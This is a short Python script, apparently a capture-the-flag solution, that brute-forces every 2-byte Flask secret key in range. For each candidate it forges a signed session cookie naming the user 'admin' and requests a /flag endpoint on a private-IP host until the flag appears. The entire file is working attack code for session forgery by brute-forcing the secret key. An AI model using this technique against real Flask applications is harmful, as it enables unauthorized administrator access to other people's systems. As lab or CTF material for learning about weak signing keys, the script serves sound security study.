import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

def crear_app(clave_secreta):
    app = Flask("ejemplo")
    app.secret_key = clave_secreta.to_bytes(2, 'big')
    return app

def generar_cookie_sesion(app):
    ses = SecureCookieSessionInterface().get_signing_serializer(app)
    sesion = {"name": "admin"}
    return ses.dumps(dict(sesion))

def searchflag(clave_secreta):
    app = crear_app(clave_secreta)
    cookie_sesion = generar_cookie_sesion(app)
    cabeceras = {"Cookie": "session=" + cookie_sesion}
    respuesta = requests.get('http://172.18.0.3:5000/flag', headers=cabeceras)
    return respuesta.text

def run1():
    print("probamos  65535 porque son 2 bytes")
    for i in range(0, 65535):
        print("entramos en for")
        print(i)
        respuesta = searchflag(i)
        if "flag{" in respuesta:
            print(respuesta)
            break

run1()




